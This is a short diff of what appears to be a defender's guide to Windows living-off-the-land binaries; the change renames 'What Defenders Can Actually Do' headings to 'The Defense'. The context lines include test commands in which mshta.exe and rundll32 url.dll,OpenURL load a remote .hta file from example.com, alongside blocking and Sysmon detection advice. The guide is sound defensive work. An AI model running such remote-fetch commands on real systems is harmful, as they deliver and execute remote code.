@@ -73,7 +73,7 @@ del C:\Windows\Temp\loltest.txt
 
 Check whether Windows Event ID 4688 captures the full command line. If the `Process Command Line` field is blank, command-line auditing is not enabled and you have a visibility gap regardless of what the tool is doing.
 
-### What Defenders Can Actually Do
+### The Defense
 
 **Restrict outbound HTTP/HTTPS from certutil.exe at the proxy or firewall.** Application-aware firewalls and web proxies can block outbound connections where the user agent or process name is `CertUtil`. This is the highest-fidelity prevention control available. Most enterprise environments have no legitimate need for certutil to reach the public internet.
 
@@ -152,7 +152,7 @@ mshta.exe http://example.com/test.hta
 
 Note whether your proxy or EDR generates any alert. If neither fires on a remote `.hta` fetch, you have a gap.
 
-### What Defenders Can Actually Do
+### The Defense
 
 **Block mshta.exe from making outbound network connections.** There is almost no legitimate reason for mshta to reach a remote URL in a managed enterprise environment. A host-based firewall rule or endpoint policy blocking outbound connections from `mshta.exe` eliminates the remote delivery vector entirely.
 
@@ -239,7 +239,7 @@ rundll32.exe url.dll,OpenURL http://example.com/test.hta
 
 Test whether your EDR or SIEM captures the command line and flags the child process relationship.
 
-### What Defenders Can Actually Do
+### The Defense
 
 **Sysmon Event ID 7 (Image Loaded) for unsigned DLLs loaded by rundll32.** This is high-value telemetry. If rundll32 loads a DLL that is not signed by a trusted publisher, that is worth investigating. Configure Sysmon's ImageLoad rule to capture DLLs loaded by rundll32:
 
